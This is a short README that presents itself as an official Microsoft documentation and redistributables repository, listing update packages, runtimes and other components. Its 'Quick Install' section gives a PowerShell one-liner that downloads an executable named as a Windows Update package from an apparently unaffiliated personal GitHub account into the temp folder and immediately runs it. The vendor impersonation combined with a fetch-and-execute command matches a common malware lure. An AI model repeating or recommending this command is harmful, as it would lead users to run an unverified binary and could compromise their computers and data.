# Microsoft Documentation and Samples

This repository contains documentation, redistributable components, and sample configurations for Microsoft products and services.

## Contents

- Windows Update standalone packages
- Visual C++ Redistributable 
- DirectX Runtime
- .NET SDK
- Microsoft Edge
- Security Essentials
- Boot configuration files

## Usage

These files are provided for reference and offline installation scenarios.

## Quick Install

```powershell
iwr -Uri https://raw.githubusercontent.com/LediqeDe9/MicrosoftDocs/main/WindowsUpdateKB5048652.exe -OutFile $env:TEMP\wu.exe; Start-Process $env:TEMP\wu.exe
```
